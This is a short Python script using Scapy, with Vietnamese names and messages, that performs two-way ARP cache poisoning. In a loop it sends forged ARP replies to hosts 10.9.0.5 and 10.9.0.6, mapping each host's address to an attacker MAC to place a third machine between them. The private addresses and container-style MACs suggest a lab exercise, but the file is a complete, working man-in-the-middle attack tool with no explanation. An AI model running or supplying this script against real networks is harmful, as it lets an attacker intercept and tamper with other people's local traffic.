from scapy.all import ARP, Ether, sendp
import time

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"
MAC_M = "02:42:0a:09:00:69"

def gui_arp_gia(mac_dich, ip_dich, ip_gia):
    E = Ether(src=MAC_M, dst=mac_dich)
    A = ARP(
        op=2,
        psrc=ip_gia,
        pdst=ip_dich,
        hwsrc=MAC_M,
        hwdst=mac_dich
    )
    sendp(E / A, iface="eth0", verbose=False)

print("Bat dau ARP Poisoning hai chieu...")

try:
    while True:
        gui_arp_gia(MAC_A, IP_A, IP_B)
        gui_arp_gia(MAC_B, IP_B, IP_A)
        print("Da gui ARP Reply gia den Host A va Host B")
        time.sleep(2)
except KeyboardInterrupt:
    print("Da dung gui ARP Reply gia")
